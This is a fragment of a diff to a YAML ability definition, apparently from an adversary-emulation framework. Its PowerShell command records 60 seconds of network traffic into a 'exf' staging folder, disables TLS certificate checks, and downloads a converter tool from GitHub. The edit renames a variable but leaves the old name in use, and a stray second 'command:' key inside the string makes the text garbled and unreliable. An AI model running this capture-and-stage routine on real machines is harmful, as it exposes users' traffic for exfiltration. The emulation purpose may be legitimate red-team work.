@@ -15,11 +15,11 @@
     name: psh
     build_target: null
     payloads: []
-    command: "$path = \"$env:PUBLIC\\exf\\capture.etl\";\nNew-NetEventSession -Name\
-      \ \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider\
-      \ -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession\
-      \ -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\n\
-      if (Test-Path $path) {\n  echo $path;\ncommand: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
+    command: "$Destination_path = \"$env:PUBLIC\\exf\\capture.etl\";\nNew-NetEventSession\
+      \ -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $Destination_path;\n\
+      Add-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\"\
+      ;\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession\
+      \ -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\ncommand: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
       \ { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"\
       https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\"\
       ,\n      \"etl2pcapng.zip\");\n      New-Item -ItemType \"directory\" $env:PUBLIC\\\
